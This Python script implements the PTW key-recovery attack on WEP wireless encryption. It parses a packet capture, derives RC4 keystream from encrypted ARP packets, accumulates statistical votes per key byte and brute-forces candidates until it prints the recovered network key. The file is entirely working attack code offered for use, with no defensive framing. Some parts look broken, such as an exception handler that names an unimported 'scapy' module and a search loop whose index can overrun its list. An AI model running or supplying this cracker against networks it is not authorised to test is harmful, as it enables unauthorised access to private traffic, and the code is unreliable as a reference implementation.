import argparse
import copy
import numpy as np
from scapy.all import rdpcap
import sys

# Constants
ARP_HEADER = bytes.fromhex("AAAA030000000806")
ARP_REQUEST = bytes.fromhex("0001080006040001")
ARP_RESPONSE = bytes.fromhex("0001080006040002")
LEN_S = 256
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
IVBYTES = 3
KSBYTES = 16
TESTBYTES = 6
MAINKEYBYTES = 13
KEYLIMIT = 1000000
IVTABLELEN = 2097152

# Helper Classes
class sorthelper:
    keybyte: int = 0
    value: np.uint8 = 0
    distance: int = 0

class doublesorthelper:
    keybyte: np.uint8
    difference: float = 0

class tableentry:
    votes: int = 0
    b: np.uint8 = 0

class session:
    iv = [None]*IVBYTES
    keystream = [None]*KSBYTES

class attackstate:
    packets_collected = 0
    seen_iv = [0] * IVTABLELEN
    sessions_collected: int = 0
    sessions = []
    for _ in range(10):
        sessions.append(session())
    table = []
    for _ in range(MAINKEYBYTES):
        table.append([])
        for _ in range(LEN_S):
            table[-1].append(tableentry())

class rc4state:
    i: np.uint8 = 0
    j: np.uint8 = 0
    s = [0]*LEN_S

class network:
    bssid: bytes
    keyid: int
    state: attackstate

# KeyCompute Functions
initial_rc4 = [i for i in range(LEN_S)]

eval_val = [
    0.00534392069257663,
    0.00531787585068872,
    0.00531345769225911,
    0.00528812219217898,
    0.00525997750378221,
    0.00522647312237696,
    0.00519132541143668,
    0.0051477139367225,
    0.00510438884847959,
    0.00505484662057323,
    0.00500502783556246,
    0.00495094196451801,
    0.0048983441590402
]

def compare(ina: tableentry) -> int:
    return ina.votes

def comparedoublesorthelper(ina: doublesorthelper) -> int:
    return ina.difference

def comparesorthelper(ina: sorthelper) -> int:
    return ina.distance

def rc4init(key: list, keylen: int):
    state = rc4state()
    state.s = copy.deepcopy(initial_rc4)
    j = 0
    for i in range(LEN_S):
        j = (j + state.s[i] + key[i % keylen]) % LEN_S
        state.s[i], state.s[j] = state.s[j], state.s[i]

    state.i = 0
    state.j = 0
    return state

def rc4update(state: rc4state):
    state.i += 1
    state.i %= LEN_S
    state.j += state.s[state.i]
    state.j %= LEN_S
    state.s[state.i], state.s[state.j] = state.s[state.j], state.s[state.i]
    k = (state.s[state.i] + state.s[state.j]) % LEN_S

    return state.s[k]

def guesskeybytes(iv: list, keystream: list, kb: int):
    state = copy.deepcopy(initial_rc4)
    j = 0
    jj = IVBYTES
    s = 0
    result = [0] * MAINKEYBYTES

    for i in range(IVBYTES):
        j += (state[i]+iv[i])
        j %= LEN_S
        state[i], state[j] = state[j], state[i]

    for i in range(kb):
        tmp = (jj-int(keystream[jj-1])) % LEN_S
        ii = 0
        while tmp != state[ii]:
            ii += 1
        s += state[jj]
        s %= LEN_S
        ii -= (j+s)
        ii %= LEN_S
        result[i] = ii
        jj += 1

    return result

def correct(state: attackstate, key: list, keylen: int):
    for i in range(state.sessions_collected):
        keybuf = []
        for j in range(IVBYTES):
            keybuf.append(copy.deepcopy(state.sessions[i].iv[j]))
        for j in range(keylen):
            keybuf.append(copy.deepcopy(key[j]))
        rcstate = rc4init(keybuf, keylen+IVBYTES)
        for j in range(TESTBYTES):
            if (rc4update(rcstate) ^ state.sessions[i].keystream[j]) != 0:
                return 0

    return 1

def getdrv(orgtable, keylen):
    numvotes = 0
    normal = [None]*MAINKEYBYTES
    outlier = [None]*MAINKEYBYTES
    for i in range(LEN_S):
        numvotes += orgtable[0][i].votes

    e = numvotes/LEN_S
    for i in range(keylen):
        emax = eval_val[i] * numvotes
        e2 = ((1.0 - eval_val[i])/255.0) * numvotes
        normal[i] = 0
        outlier[i] = 0
        maxhelp = 0.0
        maxi = 0.0
        for j in range(LEN_S):
            if orgtable[i][j].votes > maxhelp:
                maxhelp = orgtable[i][j].votes
                maxi = j

        for j in range(LEN_S):
            if j == maxi:
                help = (1.0-orgtable[i][j].votes/emax)
            else:
                help = (1.0-orgtable[i][j].votes/e2)
            help = help*help
            outlier[i] += help
            help = (1.0-orgtable[i][j].votes/e)
            help = help*help
            normal[i] += help

    return normal, outlier

def doround(sortedtable, keybyte, fixat, fixvalue, searchborders, key, keylen, state, sum, strongbytes) -> int:
    if keybyte == keylen:
        return correct(state, key, keylen)
    elif strongbytes[keybyte] == 1:
        tmp = 3 + keybyte

        for i in range(keybyte-1, 0, -1):
            tmp += 3 + key[i] + i
            key[keybyte] = (256 - tmp) % LEN_S

            if doround(sortedtable, keybyte+1, fixat, fixvalue, searchborders, key, keylen, state, (256-tmp+sum)%256, strongbytes) == 1:
                return 1
        return 0
    elif keybyte == fixat:
        key[keybyte] = (fixvalue - sum) % LEN_S
        return doround(sortedtable, keybyte+1, fixat, fixvalue, searchborders, key, keylen, state, fixvalue, strongbytes)
    else:
        for i in range(searchborders[keybyte]):
            key[keybyte] = (sortedtable[keybyte][i].b - sum) % LEN_S

            if doround(sortedtable, keybyte+1, fixat, fixvalue, searchborders, key, keylen, state, sortedtable[keybyte][i].b, strongbytes) == 1:
                return 1
        return 0

def docomputation(state, key, keylen, table, sh2, strongbytes, keylimit) -> int:
    choices = [1] * MAINKEYBYTES
    for i in range(keylen):
        if strongbytes[i] == 1:
            choices[i] = i
        else:
            choices[i] = 1

    i = 0
    prod = 0
    fixat = -1
    fixvalue = 0

    while prod < keylimit:
        if doround(table, 0, fixat, fixvalue, choices, key, keylen, state, 0, strongbytes) == 1:
            return 1

        choices[sh2[i].keybyte] += 1
        fixat = sh2[i].keybyte
        fixvalue = sh2[i].value
        prod = 1
        for j in range(keylen):
            prod *= choices[j]

        while True:
            i += 1
            if strongbytes[sh2[i].keybyte] != 1:
                break

    return 0

def computekey(state, keybuf, keylen, testlimit) -> int:
    strongbytes = [0]*MAINKEYBYTES
    helper = []
    for i in range(MAINKEYBYTES):
        helper.append(doublesorthelper())

    onestrong = (testlimit/10) * 2
    twostrong = (testlimit/10)
    simple = testlimit - onestrong - twostrong

    table = copy.deepcopy(state.table)
    for i in range(keylen):
        table[i] = sorted(table[i], key=compare, reverse=True)
        strongbytes[i] = 0

    sh1 = []
    for i in range(keylen):
        sh1.append([])
        for j in range(1, LEN_S):
            sh1[i].append(sorthelper())

    for i in range(keylen):
        for j in range(1, LEN_S):
            sh1[i][j-1].distance = table[i][0].votes - table[i][j].votes
            sh1[i][j-1].value = table[i][j].b
            sh1[i][j-1].keybyte = i

    sh = [item for sublist in sh1 for item in sublist]
    sh = sorted(sh, key=comparesorthelper, reverse=False)

    if docomputation(state, keybuf, keylen, table, sh, strongbytes, simple) == 1:
        return 1

    normal, outlier = getdrv(state.table, keylen)
    for i in range(keylen-1):
        helper[i].keybyte = i+1
        helper[i].difference = normal[i+1] - outlier[i+1]

    helper = sorted(helper[:keylen-1], key=comparedoublesorthelper, reverse=True)
    strongbytes[helper[0].keybyte] = 1
    if docomputation(state, keybuf, keylen, table, sh, strongbytes, onestrong) == 1:
        return 1

    strongbytes[helper[1].keybyte] = 1
    if docomputation(state, keybuf, keylen, table, sh, strongbytes, twostrong) == 1:
        return 1

    return 0

def addsession(state, iv, keystream):
    i = (iv[0] << 16) | (iv[1] << 8) | (iv[2])
    il = i//8
    ir = 1 << (i % 8)
    if (state.seen_iv[il] & ir) == 0:
        state.packets_collected += 1
        state.seen_iv[il] = state.seen_iv[il] | ir
        buf = guesskeybytes(iv, keystream, MAINKEYBYTES)
        for i in range(0, MAINKEYBYTES):
            state.table[i][buf[i]].votes += 1

        if state.sessions_collected < 10:
            state.sessions[state.sessions_collected].iv = iv
            state.sessions[state.sessions_collected].keystream = keystream
            state.sessions_collected += 1

        return 1
    else:
        return 0

def newattackstate():
    state = attackstate()
    for i in range(MAINKEYBYTES):
        for k in range(LEN_S):
            state.table[i][k].b = k

    return state

# PTW Functions
def GetKeystream(cipherbytes, plainbytes):
    # only get keystream of known header plaintext
    n = len(plainbytes)
    int_var = int.from_bytes(cipherbytes[:n], sys.byteorder)
    int_key = int.from_bytes(plainbytes, sys.byteorder)

    int_enc = int_var ^ int_key

    return bytearray.fromhex(bytes.hex(int_enc.to_bytes(n, sys.byteorder)))

def printkey(key, keylen: int):
    formatted_key = ":".join(f"{byte:02X}" for byte in key[:keylen])
    print(f"KEY FOUND! [ {formatted_key} ]")

def isvalidpkt(pkt):
    return ((len(pkt[0]) == 86 or len(pkt[0]) == 68) and bytes(pkt[0])[0] == 8)

def main():
    parser = argparse.ArgumentParser(description="PTW Attack Implementation")
    parser.add_argument("capturefile", help="Path to the capture file")
    args = parser.parse_args()

    print("Processing packets, could take a while")
    try:
        pcap = rdpcap(args.capturefile)
    except scapy.error.Scapy_Exception:
        print("Error. PCAP file could not be read")
        return
    except FileNotFoundError:
        print("File not found. Please check your file again")
        return

    numstates = 0
    total_tested_keys = 0
    total_ivs = 0
    try:
        for pkt in pcap:
            if isvalidpkt(pkt):
                # Packet is ARP
                currenttable = -1
                for k in range(len(networktable)):
                    if networktable[k].bssid == pkt[0].addr2 and networktable[k].keyid == pkt[1].keyid:
                        currenttable = k

                if currenttable == -1:
                    # Allocate new table
                    print("Allocating a new table")
                    print("bssid = " + str(pkt[0].addr2) + " keyindex=" + str(pkt[1].keyid))
                    numstates += 1
                    networktable.append(network())
                    networktable[numstates-1].state = newattackstate()
                    networktable[numstates-1].bssid = pkt[0].addr2
                    networktable[numstates-1].keyid = pkt[1].keyid
                    currenttable = numstates - 1

                iv = pkt[1].iv
                # Get known plaintext
                arp_known = ARP_HEADER
                if pkt[0].addr1 == BROADCAST_MAC or pkt[0].addr3 == BROADCAST_MAC:
                    arp_known += ARP_REQUEST
                else:
                    arp_known += ARP_RESPONSE

                keystream = GetKeystream(pkt[1].wepdata, arp_known)
                addsession(networktable[currenttable].state, iv, keystream)
                total_ivs += 1

        print("Analyzing packets")
        for k in range(len(networktable)):
            print("bssid = " + str(networktable[k].bssid) + " keyindex=" + str(networktable[k].keyid) + " packets=" + str(networktable[k].state.packets_collected))
            print("Checking for 40-bit key")
            if computekey(networktable[k].state, key, 5, KEYLIMIT / 10) == 1:
                printkey(key, 5)
                return
            print("Checking for 104-bit key")
            if computekey(networktable[k].state, key, 13, KEYLIMIT) == 1:
                printkey(key, 13)
                return

            print("Key not found")
            return

    except Exception as e:
        print(e)

    print(f"[{total_tested_keys}] Tested {total_tested_keys} keys (got {total_ivs} IVs)")

networktable = []
key = [None] * MAINKEYBYTES

if __name__ == "__main__":
    main()
